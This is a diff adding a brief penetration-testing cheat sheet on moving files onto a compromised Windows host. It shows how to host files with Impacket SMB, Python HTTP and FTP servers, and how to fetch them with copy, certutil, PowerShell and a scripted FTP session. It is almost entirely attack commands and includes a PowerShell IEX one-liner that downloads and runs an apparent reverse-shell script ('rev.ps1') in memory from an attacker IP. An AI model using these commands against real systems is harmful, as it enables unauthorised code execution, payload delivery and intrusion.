@@ -1,1 +1,41 @@
+Impacket SMB Server : Host Server
 
+--> smbserver.py hacker /opt/Windows-Binaries
+
+Copy : Download File
+
+--> copy \\10.10.14.6\HACKER\wget.exe C:\Windows\Tasks\wget.exe
+---------------------------------------------------------------
+Python Web Server : Host Server
+
+--> python3 -m http.server 80
+
+Certutil : Download File
+
+--> certutil -urlcache -f http://10.10.14.6/wget.exe C:\Windows\Tasks\wget.exe
+
+Powershell : Download File
+
+--> powershell -c "(new-object system.net.webclient).DownloadFile('http://10.10.14.6/wget.exe','C:\Windows\Tasks\wget.exe')"
+
+Powershell : Download File without saving it in memory execute it
+
+--> powershell "IEX(new-object net.webclient).downloadstring('http://10.10.14.6/rev.ps1')"
+
+----------------------------------------------------------------------------------------------------------------------------
+FTP : Host Server
+
+--> python3 -m pyftpdlib -u <username> -p 21 -P <password>
+
+FTP : Download File
+
+--> echo "open 10.10.14.6 21">ftp.txt
+--> echo "USER akash">>ftp.txt
+--> echo "akash">>ftp.txt
+--> echo "bin">>ftp.txt
+--> echo "GET wget.exe">>ftp.txt
+--> echo "bye">>ftp.txt
+
+Note : Check the file content after executing upper commands as sometimes quotes[" "] are ignored or maybe produce some errors try to check if the quotes are not present in the file.
+       If quotes are there then try to execute the commands without quotes[" "].
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
